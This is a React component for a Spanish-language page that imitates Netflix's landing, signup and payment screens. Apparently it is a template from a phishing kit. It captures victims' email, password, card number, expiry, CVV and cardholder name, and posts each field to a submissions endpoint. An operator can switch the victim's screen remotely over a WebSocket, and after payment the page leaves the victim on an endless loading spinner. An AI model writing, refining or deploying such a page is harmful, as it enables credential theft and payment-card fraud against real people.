import { useState, useEffect } from "react";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useWebSocket } from "@/hooks/use-websocket";
import visaImg from "@/assets/VISA.png";
import mastercardImg from "@/assets/MASTERCARD.png";
import amexImg from "@/assets/AMEX.png";
import carnetImg from "@/assets/CARNET.png";

export default function TemplateNetflix() {
  const sessionId = new URLSearchParams(window.location.search).get("sessionId");
  const { lastMessage } = useWebSocket();
  
  const [currentScreen, setCurrentScreen] = useState("landing");
  const [isLoading, setIsLoading] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    nameOnCard: "",
  });

  // Update session when screen changes
  const updateSession = async (data: any) => {
    if (!sessionId) return;
    try {
      await apiRequest("PATCH", `/api/sessions/${sessionId}`, data);
    } catch (error) {
      console.error("Failed to update session:", error);
    }
  };

  // Submit data mutation
  const submitDataMutation = useMutation({
    mutationFn: async (data: { fieldName: string; fieldValue: string }) => {
      if (!sessionId) return;
      const response = await apiRequest("POST", "/api/submissions", {
        sessionId,
        ...data,
      });
      return response.json();
    },
  });

  const submitData = async (fieldName: string, fieldValue: string) => {
    await submitDataMutation.mutateAsync({ fieldName, fieldValue });
  };

  // Listen for WebSocket updates to change screen remotely
  useEffect(() => {
    if (lastMessage) {
      try {
        console.log("Netflix template received WebSocket message:", lastMessage);
        const message = JSON.parse(lastMessage);
        console.log("Parsed message:", message);
        console.log("Current sessionId:", sessionId);
        console.log("Message sessionId:", message.data?.id);
        console.log("Current screen:", currentScreen);
        console.log("Message screen:", message.data?.currentScreen);
        
        if (message.type === 'session_updated' && 
            message.data.id === sessionId && 
            message.data.currentScreen && 
            message.data.currentScreen !== currentScreen) {
          console.log("Changing screen to:", message.data.currentScreen);
          setCurrentScreen(message.data.currentScreen);
        }
      } catch (error) {
        console.error("Error parsing WebSocket message:", error);
      }
    }
  }, [lastMessage, sessionId, currentScreen]);

  const handleInputChange = (fieldName: string, value: string) => {
    setFormData(prev => ({ ...prev, [fieldName]: value }));
  };

  const handleGetStarted = () => {
    setCurrentScreen("signup");
    updateSession({ currentScreen: "signup", status: "active" });
  };

  const handleSignupSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.email || !formData.password) return;

    await submitData("email", formData.email);
    await submitData("password", formData.password);

    // Progreso automático a la pantalla de pago
    setTimeout(async () => {
      setCurrentScreen("payment");
      await updateSession({ currentScreen: "payment", status: "active" });
    }, 1500);
  };

  const handlePaymentSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.cardNumber || !formData.expiryDate || !formData.cvv || !formData.nameOnCard) return;

    await submitData("card_number", formData.cardNumber);
    await submitData("expiry_date", formData.expiryDate);
    await submitData("cvv", formData.cvv);
    await submitData("name_on_card", formData.nameOnCard);

    setIsLoading(true);
    setCurrentScreen("loading");
    await updateSession({ currentScreen: "loading", status: "completed" });

    // Se queda en loader sin redireccionar
  };

  const renderScreen = () => {
    switch (currentScreen) {
      case "landing":
        return (
          <div className="min-h-screen bg-black text-white relative overflow-hidden">
            {/* Background gradient */}
            <div className="absolute inset-0 bg-gradient-to-b from-black via-gray-900 to-black"></div>
            
            {/* Header */}
            <header className="relative z-10 flex items-center justify-between p-6 max-w-7xl mx-auto">
              <div className="flex items-center">
                <span className="text-3xl font-bold text-red-600">NETFLIX</span>
              </div>
              <button 
                onClick={handleGetStarted}
                className="bg-red-600 hover:bg-red-700 text-white px-6 py-2 rounded font-medium transition-colors"
                data-testid="button-sign-in"
              >
                Iniciar sesión
              </button>
            </header>

            {/* Hero Content */}
            <div className="relative z-10 flex flex-col items-center justify-center min-h-screen text-center px-4">
              <h1 className="text-4xl md:text-6xl font-bold mb-6 max-w-4xl">
                Películas y series ilimitadas y mucho más
              </h1>
              <p className="text-xl md:text-2xl mb-4 text-gray-300 max-w-2xl">
                Disfruta donde quieras. Cancela cuando quieras.
              </p>
              <p className="text-lg mb-8 text-gray-400 max-w-3xl">
                ¿Quieres ver Netflix ya? Ingresa tu email para crear una cuenta o reiniciar tu membresía de Netflix.
              </p>
              <button 
                onClick={handleGetStarted}
                className="bg-red-600 hover:bg-red-700 text-white px-8 py-4 rounded text-xl font-bold transition-colors flex items-center"
                data-testid="button-get-started"
              >
                DISFRUTA GRATIS POR 30 DÍAS
                <svg className="ml-2 w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clipRule="evenodd" />
                </svg>
              </button>
            </div>

            {/* Features section */}
            <div className="relative z-10 py-20 px-4">
              <div className="max-w-6xl mx-auto">
                <div className="grid md:grid-cols-3 gap-8 text-center">
                  <div className="p-6">
                    <div className="text-4xl mb-4">📱</div>
                    <h3 className="text-xl font-bold mb-2">Cancela en cualquier momento</h3>
                    <p className="text-gray-400">Sin compromisos. Cancela en línea cuando quieras.</p>
                  </div>
                  <div className="p-6">
                    <div className="text-4xl mb-4">💻</div>
                    <h3 className="text-xl font-bold mb-2">Mirar en cualquier lugar</h3>
                    <p className="text-gray-400">Transmite en tu teléfono, tablet, laptop y TV.</p>
                  </div>
                  <div className="p-6">
                    <div className="text-4xl mb-4">🎯</div>
                    <h3 className="text-xl font-bold mb-2">Elige tu paquete</h3>
                    <p className="text-gray-400">Selecciona el plan perfecto para ti.</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        );

      case "signup":
        return (
          <div className="min-h-screen bg-white flex flex-col">
            {/* Header */}
            <header className="border-b border-gray-200 p-4">
              <div className="max-w-6xl mx-auto flex items-center justify-between">
                <span className="text-3xl font-bold text-red-600">NETFLIX</span>
                <button className="text-gray-600 hover:text-gray-800 font-medium">
                  Iniciar sesión
                </button>
              </div>
            </header>

            {/* Content */}
            <div className="flex-1 flex items-center justify-center p-4">
              <div className="w-full max-w-md">
                <div className="text-center mb-8">
                  <h1 className="text-3xl font-normal text-gray-900 mb-4">
                    Crea una contraseña para<br />que comiences tu membresía
                  </h1>
                  <p className="text-gray-600">
                    ¡Unos pasos más y listo!<br />
                    Tampoco nos gustan los trámites.
                  </p>
                </div>

                <form onSubmit={handleSignupSubmit} className="space-y-4">
                  <div className="relative">
                    <input
                      type="email"
                      value={formData.email}
                      onChange={(e) => handleInputChange("email", e.target.value)}
                      className="w-full h-14 border border-gray-400 rounded px-4 text-gray-900 text-lg peer placeholder-transparent focus:border-red-600 focus:outline-none"
                      placeholder="email"
                      data-testid="input-email"
                      required
                    />
                    <label className="absolute left-4 top-4 text-gray-500 text-lg transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-lg peer-focus:top-1 peer-focus:text-sm peer-focus:text-red-600 pointer-events-none">
                      Dirección de correo
                    </label>
                  </div>

                  <div className="relative">
                    <input
                      type="password"
                      value={formData.password}
                      onChange={(e) => handleInputChange("password", e.target.value)}
                      className="w-full h-14 border border-gray-400 rounded px-4 text-gray-900 text-lg peer placeholder-transparent focus:border-red-600 focus:outline-none"
                      placeholder="password"
                      data-testid="input-password"
                      required
                    />
                    <label className="absolute left-4 top-4 text-gray-500 text-lg transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-lg peer-focus:top-1 peer-focus:text-sm peer-focus:text-red-600 pointer-events-none">
                      Añadir una contraseña
                    </label>
                  </div>

                  <button 
                    type="submit"
                    className="w-full bg-red-600 hover:bg-red-700 text-white py-4 rounded text-xl font-bold transition-colors"
                    data-testid="button-next"
                  >
                    Siguiente
                    <svg className="inline ml-2 w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clipRule="evenodd" />
                    </svg>
                  </button>
                </form>
              </div>
            </div>
          </div>
        );

      case "payment":
        return (
          <div className="min-h-screen bg-white flex flex-col">
            {/* Header */}
            <header className="border-b border-gray-200 p-4">
              <div className="max-w-6xl mx-auto flex items-center justify-between">
                <span className="text-3xl font-bold text-red-600">NETFLIX</span>
                <button className="text-gray-600 hover:text-gray-800 font-medium">
                  Iniciar sesión
                </button>
              </div>
            </header>

            {/* Content */}
            <div className="flex-1 flex items-center justify-center p-4">
              <div className="w-full max-w-md">
                <div className="text-center mb-8">
                  <h1 className="text-3xl font-normal text-gray-900 mb-6">
                    Configura tu tarjeta de<br />crédito o débito
                  </h1>
                  
                  {/* Payment method icons */}
                  <div className="flex justify-center space-x-4 mb-8">
                    <img src={visaImg} alt="Visa" className="h-8 w-auto" />
                    <img src={mastercardImg} alt="Mastercard" className="h-8 w-auto" />
                    <img src={amexImg} alt="American Express" className="h-8 w-auto" />
                    <img src={carnetImg} alt="Carnet" className="h-8 w-auto" />
                  </div>
                </div>

                <form onSubmit={handlePaymentSubmit} className="space-y-4">
                  <div className="relative">
                    <input
                      type="text"
                      value={formData.cardNumber}
                      onChange={(e) => {
                        let value = e.target.value.replace(/\D/g, '');
                        value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
                        if (value.length <= 19) {
                          handleInputChange("cardNumber", value);
                        }
                      }}
                      className="w-full h-14 border border-gray-400 rounded px-4 text-gray-900 text-lg peer placeholder-transparent focus:border-red-600 focus:outline-none"
                      placeholder="cardnumber"
                      data-testid="input-card-number"
                      required
                    />
                    <label className="absolute left-4 top-4 text-gray-500 text-lg transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-lg peer-focus:top-1 peer-focus:text-sm peer-focus:text-red-600 pointer-events-none">
                      Número de tarjeta
                    </label>
                  </div>

                  <div className="flex space-x-4">
                    <div className="relative flex-1">
                      <input
                        type="text"
                        value={formData.expiryDate}
                        onChange={(e) => {
                          let value = e.target.value.replace(/\D/g, '');
                          if (value.length >= 2) {
                            value = value.substring(0, 2) + '/' + value.substring(2, 4);
                          }
                          if (value.length <= 5) {
                            handleInputChange("expiryDate", value);
                          }
                        }}
                        className="w-full h-14 border border-gray-400 rounded px-4 text-gray-900 text-lg peer placeholder-transparent focus:border-red-600 focus:outline-none"
                        placeholder="mmyy"
                        maxLength={5}
                        data-testid="input-expiry-date"
                        required
                      />
                      <label className="absolute left-4 top-4 text-gray-500 text-lg transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-lg peer-focus:top-1 peer-focus:text-sm peer-focus:text-red-600 pointer-events-none">
                        MM/YY
                      </label>
                    </div>

                    <div className="relative w-24">
                      <input
                        type="text"
                        value={formData.cvv}
                        onChange={(e) => handleInputChange("cvv", e.target.value.replace(/\D/g, ''))}
                        className="w-full h-14 border border-gray-400 rounded px-4 text-gray-900 text-lg peer placeholder-transparent focus:border-red-600 focus:outline-none"
                        placeholder="cvv"
                        maxLength={3}
                        data-testid="input-cvv"
                        required
                      />
                      <label className="absolute left-4 top-4 text-gray-500 text-lg transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-lg peer-focus:top-1 peer-focus:text-sm peer-focus:text-red-600 pointer-events-none">
                        CVV
                      </label>
                    </div>
                  </div>

                  <div className="relative">
                    <input
                      type="text"
                      value={formData.nameOnCard}
                      onChange={(e) => handleInputChange("nameOnCard", e.target.value)}
                      className="w-full h-14 border border-gray-400 rounded px-4 text-gray-900 text-lg peer placeholder-transparent focus:border-red-600 focus:outline-none"
                      placeholder="name"
                      data-testid="input-name-on-card"
                      required
                    />
                    <label className="absolute left-4 top-4 text-gray-500 text-lg transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-lg peer-focus:top-1 peer-focus:text-sm peer-focus:text-red-600 pointer-events-none">
                      Nombre en la tarjeta
                    </label>
                  </div>

                  <button 
                    type="submit"
                    className="w-full bg-red-600 hover:bg-red-700 text-white py-4 rounded text-xl font-bold transition-colors"
                    data-testid="button-start-membership"
                  >
                    Comenzar membresía
                  </button>
                </form>

                <p className="text-xs text-gray-500 text-center mt-4">
                  Al hacer clic en "Comenzar membresía", aceptas nuestros Términos de uso.
                </p>
              </div>
            </div>
          </div>
        );

      case "loading":
        return (
          <div className="min-h-screen bg-black flex items-center justify-center">
            <div className="text-center text-white">
              <div className="mb-8">
                <span className="text-4xl font-bold text-red-600">NETFLIX</span>
              </div>
              <div className="animate-spin w-12 h-12 border-4 border-red-600 border-t-transparent rounded-full mx-auto mb-6"></div>
              <p className="text-xl text-gray-300">Configurando tu cuenta...</p>
              <p className="text-sm text-gray-500 mt-2">Esto puede tomar unos momentos</p>
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  return renderScreen();
}